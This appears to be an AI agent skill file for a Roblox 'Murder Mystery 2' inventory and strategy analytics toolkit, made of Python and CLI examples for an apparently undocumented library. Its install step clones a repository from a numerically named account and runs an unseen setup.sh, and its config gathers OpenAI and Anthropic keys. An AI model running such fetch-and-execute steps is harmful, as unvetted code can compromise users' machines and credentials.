---
name: mm2-roblox-analytics-toolkit
description: Murder Mystery 2 gameplay analytics, inventory tracking, and strategy optimization toolkit for Roblox
triggers:
  - "analyze my Murder Mystery 2 inventory"
  - "track MM2 knife skins and stats"
  - "optimize my Roblox MM2 strategy"
  - "set up Murder Mystery 2 analytics dashboard"
  - "export my MM2 collection data"
  - "configure roblox stats tracker"
  - "run mm2 performance analysis"
  - "generate murder mystery gameplay report"
---

# MM2 Roblox Analytics Toolkit

> Skill by [ara.so](https://ara.so) — Data Skills collection.

This toolkit provides comprehensive analytics and inventory management for Roblox's Murder Mystery 2 game. It tracks knife skins, gamepasses, win/loss ratios, and provides AI-powered strategy insights through data visualization and pattern analysis.

## Installation

### Quick Setup (Automated)

```bash
git clone https://github.com/8015238355/mm2-analytics-dashboard-2026.git
cd mm2-analytics-dashboard-2026
chmod +x setup.sh
./setup.sh --install
```

### Manual Installation

```bash
# Clone repository
git clone https://github.com/8015238355/mm2-analytics-dashboard-2026.git
cd mm2-analytics-dashboard-2026

# Install Node.js dependencies
npm install

# Install Python dependencies
python3 -m pip install -r requirements.txt
```

### Environment Configuration

Create a `.env` file in the project root:

```bash
API_OPENAI_KEY=${OPENAI_API_KEY}
API_CLAUDE_KEY=${ANTHROPIC_API_KEY}
DATA_DIRECTORY=./data/collections
ANALYTICS_INTERVAL=300
ENABLE_LIVE_TRACKING=true
ROBLOX_USER_ID=${YOUR_ROBLOX_USER_ID}
```

## Core Features

### 1. Inventory Management

Track and catalog your MM2 items including knife skins, gamepasses, and collectibles.

```python
# Python API for inventory tracking
from mm2_toolkit import InventoryManager

# Initialize inventory manager
inventory = InventoryManager(user_id=os.environ['ROBLOX_USER_ID'])

# Scan and catalog items
inventory.scan_inventory()
knife_skins = inventory.get_items(category='knife_skins', rarity='legendary')

# Export inventory data
inventory.export(format='json', output='my_inventory.json')

# Get collection statistics
stats = inventory.get_statistics()
print(f"Total items: {stats['total_count']}")
print(f"Legendary items: {stats['legendary_count']}")
print(f"Collection completion: {stats['completion_percentage']}%")
```

### 2. Analytics Dashboard

Generate gameplay statistics and performance metrics.

```python
from mm2_toolkit import AnalyticsDashboard

# Initialize analytics
dashboard = AnalyticsDashboard(profile='mystery_solver_01')

# Load gameplay data
dashboard.load_data(date_range='last_30_days')

# Generate reports
report = dashboard.generate_report(
    metrics=['win_rate', 'avg_survival_time', 'role_performance'],
    export_format='json'
)

# Visualize data
dashboard.create_visualization(
    chart_type='line',
    metric='win_rate_over_time',
    output='charts/performance.png'
)
```

### 3. Strategy Optimization

Analyze gameplay patterns and receive AI-powered recommendations.

```python
from mm2_toolkit import StrategyOptimizer

# Initialize optimizer with AI backend
optimizer = StrategyOptimizer(
    openai_key=os.environ['API_OPENAI_KEY'],
    claude_key=os.environ['API_CLAUDE_KEY']
)

# Analyze strategy patterns
patterns = optimizer.analyze_patterns(
    role='sheriff',
    game_count=50
)

# Get AI recommendations
recommendations = optimizer.get_recommendations(
    current_strategy='aggressive_sheriff',
    win_rate_target=0.75
)

for rec in recommendations:
    print(f"Strategy: {rec['name']}")
    print(f"Description: {rec['description']}")
    print(f"Expected improvement: {rec['improvement_percentage']}%")
```

## CLI Commands

### Basic Usage

```bash
# Run analytics on profile
python3 main.py --mode analytics --profile mystery_solver_01

# Export inventory
python3 main.py --mode inventory --export inventory.json --format json

# Generate strategy report
python3 main.py --mode strategy --role sheriff --output strategy_report.pdf

# Live tracking mode
python3 main.py --mode live --interval 60 --log-level INFO
```

### Advanced Options

```bash
# Comprehensive analysis with verbose output
python3 main.py \
    --mode analytics \
    --profile mystery_solver_01 \
    --export statistics_2026.json \
    --format json \
    --date-range "2026-01-01:2026-05-16" \
    --verbose \
    --log-level DEBUG

# Batch process multiple profiles
python3 main.py \
    --mode batch \
    --profiles profile1,profile2,profile3 \
    --export-dir ./exports \
    --parallel

# Strategy simulation
python3 main.py \
    --mode simulate \
    --strategy aggressive_sheriff \
    --iterations 1000 \
    --output simulation_results.csv
```

## Configuration Patterns

### Profile Configuration (YAML)

```yaml
# config/profiles/player_profile.yaml
profile:
  username: "MysterySolver2026"
  roblox_user_id: "${ROBLOX_USER_ID}"
  preferred_role: "sheriff"
  
  inventory_filter:
    - category: "knife_skins"
      rarity: ["legendary", "ancient"]
    - category: "gamepasses"
      active: true
  
  analytics_preferences:
    tracking_mode: "comprehensive"
    data_refresh_rate: 30
    export_format: ["csv", "json"]
    enable_ai_insights: true
  
  strategy_templates:
    - name: "aggressive_sheriff"
      priority: "high_visibility_areas"
      risk_tolerance: 0.7
    - name: "passive_innocent"
      priority: "distraction_avoidance"
      risk_tolerance: 0.3
```

### Data Export Configuration

```python
# Configure export settings
from mm2_toolkit import ExportManager

exporter = ExportManager()

# Export inventory with custom formatting
exporter.export_inventory(
    format='json',
    include_metadata=True,
    compress=True,
    output='exports/inventory_backup.json.gz'
)

# Export analytics to multiple formats
exporter.export_analytics(
    formats=['csv', 'json', 'excel'],
    date_range='last_7_days',
    output_dir='exports/weekly_report'
)

# Schedule automated exports
exporter.schedule_export(
    frequency='daily',
    time='23:00',
    formats=['json'],
    output_dir='exports/daily_backups'
)
```

## Working Examples

### Complete Inventory Analysis

```python
#!/usr/bin/env python3
import os
from mm2_toolkit import InventoryManager, AnalyticsDashboard
from datetime import datetime

def analyze_inventory():
    # Initialize managers
    inventory = InventoryManager(user_id=os.environ['ROBLOX_USER_ID'])
    dashboard = AnalyticsDashboard(profile='main_profile')
    
    # Scan current inventory
    print("Scanning inventory...")
    inventory.scan_inventory()
    
    # Get knife skin statistics
    knife_stats = inventory.get_category_stats('knife_skins')
    print(f"\nKnife Skins Summary:")
    print(f"Total: {knife_stats['total']}")
    print(f"Legendary: {knife_stats['legendary']}")
    print(f"Ancient: {knife_stats['ancient']}")
    
    # Calculate inventory value
    total_value = inventory.calculate_total_value()
    print(f"\nEstimated Inventory Value: {total_value} coins")
    
    # Identify missing items
    missing = inventory.get_missing_items(category='knife_skins')
    print(f"\nMissing Legendary Skins: {len(missing)}")
    for item in missing[:5]:
        print(f"  - {item['name']} (Drop rate: {item['drop_rate']}%)")
    
    # Export results
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    inventory.export(
        format='json',
        output=f'reports/inventory_{timestamp}.json'
    )
    print(f"\nReport saved to reports/inventory_{timestamp}.json")

if __name__ == "__main__":
    analyze_inventory()
```

### Strategy Performance Tracking

```python
#!/usr/bin/env python3
import os
from mm2_toolkit import StrategyOptimizer, AnalyticsDashboard

def track_strategy_performance():
    # Initialize components
    optimizer = StrategyOptimizer(
        openai_key=os.environ.get('API_OPENAI_KEY'),
        claude_key=os.environ.get('API_CLAUDE_KEY')
    )
    dashboard = AnalyticsDashboard(profile='competitive_player')
    
    # Load recent gameplay data
    dashboard.load_data(date_range='last_14_days')
    
    # Analyze each role
    roles = ['sheriff', 'murderer', 'innocent']
    results = {}
    
    for role in roles:
        performance = dashboard.get_role_performance(role)
        patterns = optimizer.analyze_patterns(role=role, game_count=100)
        
        results[role] = {
            'win_rate': performance['win_rate'],
            'avg_survival': performance['avg_survival_time'],
            'games_played': performance['games_played'],
            'top_strategy': patterns['most_successful_pattern'],
            'improvement_areas': patterns['improvement_suggestions']
        }
        
        print(f"\n{role.upper()} Performance:")
        print(f"  Win Rate: {performance['win_rate']:.1%}")
        print(f"  Avg Survival: {performance['avg_survival_time']:.1f}s")
        print(f"  Games: {performance['games_played']}")
    
    # Get AI recommendations
    recommendations = optimizer.get_recommendations(
        current_strategy='balanced',
        win_rate_target=0.70
    )
    
    print("\n=== AI Strategy Recommendations ===")
    for i, rec in enumerate(recommendations[:3], 1):
        print(f"\n{i}. {rec['name']}")
        print(f"   {rec['description']}")
        print(f"   Expected improvement: +{rec['improvement_percentage']}%")
    
    # Export comprehensive report
    dashboard.export_report(
        data=results,
        recommendations=recommendations,
        format='pdf',
        output='reports/strategy_analysis.pdf'
    )

if __name__ == "__main__":
    track_strategy_performance()
```

### Live Data Collection

```python
#!/usr/bin/env python3
import os
import time
from mm2_toolkit import LiveTracker, DataCollector

def live_tracking_session():
    # Initialize live tracker
    tracker = LiveTracker(
        user_id=os.environ['ROBLOX_USER_ID'],
        refresh_rate=30  # seconds
    )
    
    collector = DataCollector(output_dir='data/live_sessions')
    
    print("Starting live tracking session...")
    print("Press Ctrl+C to stop\n")
    
    try:
        tracker.start()
        
        while True:
            # Get current game state
            state = tracker.get_current_state()
            
            if state['in_game']:
                print(f"[{state['timestamp']}] Role: {state['role']}")
                print(f"  Status: {state['status']}")
                print(f"  Survival Time: {state['survival_time']}s")
                
                # Collect data point
                collector.add_data_point(state)
                
            else:
                print(f"[{state['timestamp']}] Waiting for game...")
            
            time.sleep(30)
            
    except KeyboardInterrupt:
        print("\n\nStopping tracker...")
        tracker.stop()
        
        # Save collected data
        session_file = collector.save_session()
        print(f"Session data saved to: {session_file}")
        
        # Generate session summary
        summary = collector.get_session_summary()
        print(f"\nSession Summary:")
        print(f"  Duration: {summary['duration']} minutes")
        print(f"  Games Played: {summary['games_played']}")
        print(f"  Win Rate: {summary['win_rate']:.1%}")

if __name__ == "__main__":
    live_tracking_session()
```

## Troubleshooting

### Common Issues

**Issue: API rate limiting**
```python
# Implement rate limiting and retry logic
from mm2_toolkit import APIClient
import time

client = APIClient(
    rate_limit=10,  # requests per minute
    retry_attempts=3,
    retry_delay=5
)

try:
    data = client.fetch_inventory()
except APIClient.RateLimitError:
    print("Rate limit reached. Waiting 60 seconds...")
    time.sleep(60)
    data = client.fetch_inventory()
```

**Issue: Missing environment variables**
```python
# Validate environment setup
import os
import sys

required_vars = ['ROBLOX_USER_ID', 'DATA_DIRECTORY']
missing = [var for var in required_vars if not os.environ.get(var)]

if missing:
    print(f"Error: Missing environment variables: {', '.join(missing)}")
    print("Please configure .env file with required variables")
    sys.exit(1)
```

**Issue: Data sync conflicts**
```bash
# Clear cache and resync
python3 main.py --clear-cache
python3 main.py --mode inventory --force-sync
```

**Issue: Export format errors**
```python
# Validate export settings
from mm2_toolkit import ExportManager

exporter = ExportManager()

# Check supported formats
supported = exporter.get_supported_formats()
print(f"Supported formats: {', '.join(supported)}")

# Export with validation
try:
    exporter.export_inventory(format='json', validate=True)
except ValueError as e:
    print(f"Export error: {e}")
```

## Best Practices

1. **Regular Backups**: Schedule daily inventory exports
2. **API Key Security**: Never commit API keys; use environment variables
3. **Data Validation**: Validate imported data before analysis
4. **Rate Limiting**: Respect API rate limits to avoid throttling
5. **Incremental Sync**: Use incremental updates for large inventories
6. **Error Handling**: Implement try-catch blocks for network operations

## Additional Resources

- Repository: https://github.com/8015238355/mm2-analytics-dashboard-2026
- Documentation: Check repository README for detailed feature documentation
- Community: Join Discord for support and strategy discussions
